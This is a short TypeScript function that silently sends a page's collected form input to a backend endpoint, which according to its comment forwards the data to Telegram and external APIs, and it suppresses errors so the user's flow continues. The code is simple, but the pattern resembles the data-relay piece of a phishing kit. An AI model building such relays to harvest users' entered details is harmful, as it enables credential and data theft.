/**
 * Sends a page's collected input details to the backend data-forwarding
 * endpoint, which fans it out to every configured destination (Telegram,
 * an external API, etc). Never throws so it can't block the UI flow.
 */
export async function reportToTelegram(
  page: string,
  fields: Record<string, unknown>,
): Promise<void> {
  try {
    await fetch("/api/forward", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ page, ...fields }),
    })
  } catch {
    // ignore network errors and continue the flow
  }
}
